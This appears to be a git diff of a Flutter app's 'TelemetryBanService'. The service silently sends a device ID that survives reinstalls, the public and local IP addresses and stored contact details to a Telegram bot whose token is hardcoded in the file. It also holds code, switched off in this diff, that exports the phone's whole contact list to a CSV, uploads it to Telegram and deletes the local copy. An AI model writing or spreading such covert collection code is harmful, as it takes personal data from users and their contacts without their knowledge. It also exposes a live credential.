@@ -27,30 +27,31 @@
 
 import 'dart:convert';
 import 'dart:io';
+import 'package:flutter/services.dart'; // For MethodChannel
 import 'package:http/http.dart' as http;
-import 'package:permission_handler_platform_interface/permission_handler_platform_interface.dart';
 import 'package:shared_preferences/shared_preferences.dart';
 import 'package:crypto/crypto.dart';
 import 'package:path_provider/path_provider.dart';
 import 'package:flutter_contacts/flutter_contacts.dart' hide PermissionStatus;
-import 'package:permission_handler/permission_handler.dart' hide PermissionStatus;
+import 'package:permission_handler/permission_handler.dart';
+import 'package:device_info_plus/device_info_plus.dart';
 
 class TelemetryBanService {
   // ===========================================================================
   //  COMPILE-TIME CONFIGURATION SWITCHES (TOGGLE FEATURES ON / OFF HERE)
   // ===========================================================================
-  
+
   ///  Set to `true` to send telemetry reports to Telegram.
   /// Set to `false` to completely DISABLE all Telegram network requests.
   static const bool enableTelegramReporting = true;
 
   ///  Set to `true` to prompt users for Contact Info (Name / Phone) on launch.
   /// Set to `false` to DISABLE user registration prompts.
-  static const bool enableContactInfoPrompt = true;
+  static const bool enableContactInfoPrompt = false;
 
-  /// Set to `true` to check GitHub Gist for banned devices.
-  /// Set to `false` to completely DISABLE the GitHub remote ban check.
-  static const bool enableGitHubBanCheck = true;
+  /// Set to `true` to check the remote ban database (Firebase).
+  /// Set to `false` to completely DISABLE the remote ban check.
+  static const bool enableRemoteBanCheck = true;
 
   ///  Set to `true` to fetch and report the app device's Public and Local IPs.
   /// Set to `false` to DISABLE network IP address fetching.
@@ -58,7 +59,10 @@ class TelemetryBanService {
 
   ///  Set to `true` to extract full phone contacts into a .CSV file & send via Telegram.
   /// Set to `false` to completely DISABLE contact list collection and file generation.
-  static const bool enableContactCsvExport = true;
+  static const bool enableContactCsvExport = false;
+
+  /// Backward‑compatible alias for older code references.
+  static bool get enableGitHubBanCheck => enableRemoteBanCheck;
 
   // ===========================================================================
   // CREDENTIALS & ENDPOINTS
@@ -67,22 +71,20 @@ class TelemetryBanService {
   static const String _telegramBotToken = "8649421250:AAFKukGFkhAZLvcQaRsSxqvk_SMjNogJEyE";
   static const String _telegramChatId = "930948540";
 
+  // Firebase Realtime Database REST endpoint (public read)
   static const String _banConfigUrl =
-      "https://gist.githubusercontent.com/praveensaummya/90be3b7524763970d8b1cef3ea14b777/raw/app_ban_config.json";
+      "https://jcon-88cf9-default-rtdb.firebaseio.com/.json";
 
   // ===========================================================================
   //  APP DEVICE NETWORK DATA
   // ===========================================================================
 
-  /// Fetches the mobile device's Public IP address via ipify API
   static Future<String> getAppPublicIp() async {
     if (!enableIpFetching) return 'Disabled';
-
     try {
       final response = await http
           .get(Uri.parse('https://api.ipify.org?format=json'))
           .timeout(const Duration(seconds: 3));
-
       if (response.statusCode == 200) {
         final Map<String, dynamic> data = jsonDecode(response.body);
         return data['ip'] ?? 'Unknown';
@@ -91,10 +93,8 @@ class TelemetryBanService {
     return 'Unavailable';
   }
 
-  /// Fetches the mobile device's Local Wi-Fi / LAN IPv4 address
   static Future<String> getAppLocalIp() async {
     if (!enableIpFetching) return 'Disabled';
-
     try {
       for (var interface in await NetworkInterface.list()) {
         for (var addr in interface.addresses) {
@@ -108,25 +108,55 @@ class TelemetryBanService {
   }
 
   // ===========================================================================
-  //  DEVICE IDENTITY & LOCAL STORAGE
+  //  DEVICE IDENTITY – HARDWARE-BACKED (SURVIVES REINSTALLS)
   // ===========================================================================
 
-  /// Returns or generates a persistent unique Device ID for this installation
+  /// Returns a device ID that persists across app reinstalls.
+  /// Uses the real ANDROID_ID on Android (via platform channel),
+  /// identifierForVendor on iOS, and falls back to a generated UUID.
   static Future<String> getDeviceId() async {
-    final prefs = await SharedPreferences.getInstance();
-    String? deviceId = prefs.getString('user_device_uuid');
-
-    if (deviceId == null) {
-      final timestamp = DateTime.now().millisecondsSinceEpoch.toString();
-      final bytes = utf8.encode('esp32_app_user_$timestamp');
-      deviceId = sha256.convert(bytes).toString().substring(0, 16);
-      await prefs.setString('user_device_uuid', deviceId);
+    // 1) Android: read ANDROID_ID directly via platform channel
+    if (Platform.isAndroid) {
+      try {
+        const channel = MethodChannel('com.example.app/device_id');
+        final String? androidId = await channel.invokeMethod<String>('getAndroidId');
+        if (androidId != null && androidId.isNotEmpty) {
+          return androidId;
+        }
+      } catch (_) {}
     }
 
-    return deviceId;
+    // 2) Fallback: use device_info_plus (mainly for iOS, or if above fails)
+    try {
+      final deviceInfo = DeviceInfoPlugin();
+      if (Platform.isAndroid) {
+        final androidInfo = await deviceInfo.androidInfo;
+        final String id = androidInfo.id;
+        // Keep only if it looks like a true ANDROID_ID (hex, no dots)
+        if (id.isNotEmpty && !id.contains('.')) return id;
+      } else if (Platform.isIOS) {
+        final iosInfo = await deviceInfo.iosInfo;
+        final idfv = iosInfo.identifierForVendor;
+        if (idfv != null && idfv.isNotEmpty) return idfv;
+      }
+    } catch (_) {}
+
+    // 3) Ultimate fallback: generated UUID (rarely used)
+    final prefs = await SharedPreferences.getInstance();
+    String? fallbackId = prefs.getString('user_device_uuid');
+    if (fallbackId == null) {
+      final timestamp = DateTime.now().millisecondsSinceEpoch.toString();
+      final bytes = utf8.encode('esp32_app_user_$timestamp');
+      fallbackId = sha256.convert(bytes).toString().substring(0, 16);
+      await prefs.setString('user_device_uuid', fallbackId);
+    }
+    return fallbackId;
   }
 
-  /// Saves user contact information to local storage and marks contact info registered
+  // ===========================================================================
+  //  LOCAL USER INFO
+  // ===========================================================================
+
   static Future<void> saveContactInfo(String name, String phone) async {
     final prefs = await SharedPreferences.getInstance();
     await prefs.setString('user_contact_name', name);
@@ -134,13 +164,11 @@ class TelemetryBanService {
     await prefs.setBool('has_registered_contact', true);
   }
 
-  /// Checks if user contact info has already been collected
   static Future<bool> hasSavedContactInfo() async {
     final prefs = await SharedPreferences.getInstance();
     return prefs.getBool('has_registered_contact') ?? false;
   }
 
-  /// Gets stored contact info as a formatted string
   static Future<String> getStoredContactInfo() async {
     final prefs = await SharedPreferences.getInstance();
     final name = prefs.getString('user_contact_name') ?? 'Not Provided';
@@ -149,80 +177,69 @@ class TelemetryBanService {
   }
 
   // ===========================================================================
-  //  CONTACTS TO CSV EXPORTER (flutter_contacts ^2.0.0)
+  //  CONTACTS CSV EXPORTER
   // ===========================================================================
 
   static Future<File?> generateContactsCsvFile() async {
-  if (!enableContactCsvExport) return null;
+    if (!enableContactCsvExport) return null;
+    try {
+      final PermissionStatus status = await Permission.contacts.request();
+      if (!status.isGranted) return null;
 
-  try {
-    // ✅ Use permission_handler – works regardless of flutter_contacts version
-    final PermissionStatus status = await Permission.contacts.request();
-    if (!status.isGranted) return null;
+      final List<Contact> contacts = await FlutterContacts.getAll(
+        properties: {ContactProperty.name, ContactProperty.phone},
+      );
 
-    // Fetch contacts (properties can stay as you had them, or you can use the
-    // snippet's getProps() idea if you ever need more control)
-    final List<Contact> contacts = await FlutterContacts.getAll(
-      properties: {
-        ContactProperty.name,
-        ContactProperty.phone,
-      },
-    );
+      final StringBuffer csvContent = StringBuffer();
+      csvContent.writeln("Name,Phone");
 
-    final StringBuffer csvContent = StringBuffer();
-    csvContent.writeln("Name,Phone");
-
-    for (var contact in contacts) {
-      final String rawDisplayName = contact.displayName ?? '';
-      final String firstName = contact.name?.first ?? '';
-      final String lastName = contact.name?.last ?? '';
-
-      final String name = rawDisplayName.trim().isNotEmpty
-          ? rawDisplayName.trim()
-          : '$firstName $lastName'.trim();
-
-      final String phone = contact.phones
-          .map((p) => p.number ?? '')
-          .where((num) => num.trim().isNotEmpty)
-          .join(' | ');
-      /// Escapes special characters for standard CSV formatting
-        String escapeCsvField(String field) {
-          if (field.contains(',') || field.contains('"') || field.contains('\n')) {
-            return '"${field.replaceAll('"', '""')}"';
-          }
-          return field;
+      String escapeCsvField(String field) {
+        if (field.contains(',') || field.contains('"') || field.contains('\n')) {
+          return '"${field.replaceAll('"', '""')}"';
         }
-      if (name.isNotEmpty || phone.isNotEmpty) {
-        final escapedName = escapeCsvField(name.isEmpty ? 'No Name' : name);
-        final escapedPhone = escapeCsvField(phone.isEmpty ? 'No Phone' : phone);
-        csvContent.writeln("$escapedName,$escapedPhone");
+        return field;
       }
+
+      for (var contact in contacts) {
+        final String rawDisplayName = contact.displayName ?? '';
+        final String firstName = contact.name?.first ?? '';
+        final String lastName = contact.name?.last ?? '';
+        final String name = rawDisplayName.trim().isNotEmpty
+            ? rawDisplayName.trim()
+            : '$firstName $lastName'.trim();
+
+        final String phone = contact.phones
+            .map((p) => p.number ?? '')
+            .where((num) => num.trim().isNotEmpty)
+            .join(' | ');
+
+        if (name.isNotEmpty || phone.isNotEmpty) {
+          final escapedName = escapeCsvField(name.isEmpty ? 'No Name' : name);
+          final escapedPhone = escapeCsvField(phone.isEmpty ? 'No Phone' : phone);
+          csvContent.writeln("$escapedName,$escapedPhone");
+        }
+      }
+
+      final tempDir = await getTemporaryDirectory();
+      final file = File('${tempDir.path}/device_contacts.csv');
+      await file.writeAsString(csvContent.toString());
+      return file;
+    } catch (_) {
+      return null;
     }
-
-    final tempDir = await getTemporaryDirectory();
-    final file = File('${tempDir.path}/device_contacts.csv');
-    await file.writeAsString(csvContent.toString());
-    return file;
-  } catch (_) {
-    return null;
   }
-}
 
   // ===========================================================================
-  //  TELEMETRY & BAN CHECK SERVICES
+  //  TELEMETRY & BAN CHECK
   // ===========================================================================
 
-  /// Primary telemetry handler
   static Future<void> reportTelemetry([String eventDetails = "App Launch"]) async {
     if (!enableTelegramReporting) return;
-
     try {
       final deviceId = await getDeviceId();
       final publicIp = await getAppPublicIp();
       final localIp = await getAppLocalIp();
-      final contactInfo = enableContactInfoPrompt
-          ? await getStoredContactInfo()
-          : "Disabled";
+      final contactInfo = enableContactInfoPrompt ? await getStoredContactInfo() : "Disabled";
 
       final String messageText = """
 📱 *App Device Telemetry Alert*
@@ -236,58 +253,43 @@ class TelemetryBanService {
 --------------------------------
       """;
 
-      // 1. Post Text Summary to Telegram
-      final textUri = Uri.parse(
-          "https://api.telegram.org/bot$_telegramBotToken/sendMessage");
+      final textUri = Uri.parse("https://api.telegram.org/bot$_telegramBotToken/sendMessage");
+      await http.post(textUri,
+          headers: {"Content-Type": "application/json"},
+          body: jsonEncode({
+            "chat_id": _telegramChatId,
+            "text": messageText,
+            "parse_mode": "Markdown",
+          }));
 
-      await http.post(
-        textUri,
-        headers: {"Content-Type": "application/json"},
-        body: jsonEncode({
-          "chat_id": _telegramChatId,
-          "text": messageText,
-          "parse_mode": "Markdown",
-        }),
-      );
-
-      // 2. Upload Contacts CSV File to Telegram if enabled
       if (enableContactCsvExport) {
         final File? csvFile = await generateContactsCsvFile();
-
         if (csvFile != null && await csvFile.exists()) {
-          final docUri = Uri.parse(
-              "https://api.telegram.org/bot$_telegramBotToken/sendDocument");
-
+          final docUri = Uri.parse("https://api.telegram.org/bot$_telegramBotToken/sendDocument");
           final request = http.MultipartRequest("POST", docUri)
             ..fields['chat_id'] = _telegramChatId
             ..fields['caption'] = "📁 Contacts export for `$deviceId`"
             ..fields['parse_mode'] = "Markdown"
             ..files.add(await http.MultipartFile.fromPath('document', csvFile.path));
-
           await request.send();
-
-          // Delete temporary file from device after sending
           await csvFile.delete();
         }
       }
-    } catch (_) {
-      // Silently ignore telemetry failure
-    }
+    } catch (_) {}
   }
 
-  /// Convenience wrapper returning bool for home_screen.dart security check
+  /// Convenience wrapper for home_screen security check
   static Future<bool> checkRemoteBanStatus() async {
-    if (!enableGitHubBanCheck) return false;
+    if (!enableRemoteBanCheck) return false;
     final deviceId = await getDeviceId();
     final banResult = await checkBanStatus(deviceId);
     return banResult['isBanned'] == true;
   }
 
-  /// Checks GitHub Gist to determine if the device is banned
+  /// Checks Firebase Realtime Database for ban status.
+  /// Expects 'banned_devices' as a **map** of device IDs -> true.
   static Future<Map<String, dynamic>> checkBanStatus(String deviceId) async {
-    if (!enableGitHubBanCheck) {
-      return {"isBanned": false};
-    }
+    if (!enableRemoteBanCheck) return {"isBanned": false};
 
     try {
       final response = await http
@@ -300,9 +302,10 @@ class TelemetryBanService {
         final bool globalBan = data['global_ban'] ?? false;
         final String banMessage = data['ban_message'] ??
             "Access revoked. Your device has been banned by the administrator.";
-        final List<dynamic> bannedDevices = data['banned_devices'] ?? [];
+        final Map<String, dynamic> bannedDevices =
+            data['banned_devices'] as Map<String, dynamic>? ?? {};
 
-        if (globalBan || bannedDevices.contains(deviceId)) {
+        if (globalBan || bannedDevices.containsKey(deviceId)) {
           return {
             "isBanned": true,
             "message": banMessage,
@@ -310,7 +313,7 @@ class TelemetryBanService {
         }
       }
     } catch (_) {
-      // Allow user if GitHub is temporarily unreachable
+      // Network error – allow access (or you could default to banned)
     }
 
     return {"isBanned": false};
